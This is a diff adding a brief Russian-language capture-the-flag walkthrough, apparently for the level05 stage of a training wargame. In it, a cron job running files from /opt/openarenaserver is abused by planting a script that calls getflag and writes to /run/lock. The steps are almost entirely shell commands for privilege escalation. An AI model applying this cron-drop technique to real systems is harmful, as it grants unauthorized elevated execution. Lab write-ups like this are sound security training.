@@ -1,0 +1,7 @@
+Если зайти на учетку то увидим мейл от крона
+1. find / -user flag05 2>/dev/null
+2. cat /usr/sbin/openarenaserver
+3. vim /opt/openarenaserver/1
+getflag > /run/lock/1
+4. chmod +x /opt/openarenaserver/1
+5. cat /run/lock/1
